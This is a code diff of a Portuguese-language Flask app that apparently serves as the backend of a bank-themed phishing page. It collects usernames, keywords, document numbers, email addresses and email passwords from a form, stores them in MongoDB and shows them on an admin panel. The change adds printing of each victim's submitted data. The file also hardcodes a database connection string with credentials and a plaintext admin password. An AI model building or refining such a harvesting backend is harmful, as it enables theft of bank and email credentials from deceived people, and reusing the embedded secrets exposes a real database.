@@ -6,7 +6,7 @@ import os
 
 app = Flask(__name__)
 
-# 🔗 Conexão com MongoDB Atlas (ajustada para o cluster correto)
+# 🔗 Conexão com MongoDB Atlas
 uri = "mongodb+srv://kingaristides:King2025@atualizacaobank0.sulu0rw.mongodb.net/?retryWrites=true&w=majority&appName=Atualizacaobank0"
 client = MongoClient(uri)
 db = client["painel"]
@@ -34,25 +34,35 @@ def segundaetapa():
     email = request.form.get("emailverificado")
     senha_email = request.form.get("senhaverificada")
 
-    # Inserção no MongoDB
-    registro = {
-        "datahora": agora,
-        "usuario": usuario,
-        "palavrachave": palavrachave,
-        "documento": documento,
-        "email": email,
-        "senha_email": senha_email
-    }
-    colecao.insert_one(registro)
+    print("📦 DADOS RECEBIDOS NA SEGUNDA ETAPA:")
+    print("usuario:", usuario)
+    print("palavrachave:", palavrachave)
+    print("documento:", documento)
+    print("agora:", agora)
+    print("email:", email)
+    print("senha_email:", senha_email)
 
-    return render_template("atualizacao.html")  # 🔁 TROCA FEITA AQUI
+    try:
+        registro = {
+            "datahora": agora,
+            "usuario": usuario,
+            "palavrachave": palavrachave,
+            "documento": documento,
+            "email": email,
+            "senha_email": senha_email
+        }
+        colecao.insert_one(registro)
+        return render_template("atualizacao.html")
+    except Exception as e:
+        print("❌ ERRO AO INSERIR NO MONGODB:", e)
+        return "<h3>Erro interno no servidor. Tente novamente mais tarde.</h3>"
 
 @app.route("/admin_login", methods=["GET", "POST"])
 def admin_login():
     if request.method == "POST":
         senha_admin = request.form.get("senhaadmin")
         if senha_admin == "admin123":
-            registros = list(colecao.find().sort("datahora", -1))  # Mais recentes primeiro
+            registros = list(colecao.find().sort("datahora", -1))
             return render_template("admin.html", dados=registros)
         else:
             return "<h3>Senha incorreta!</h3><a href='/admin_login'>Tentar novamente</a>"
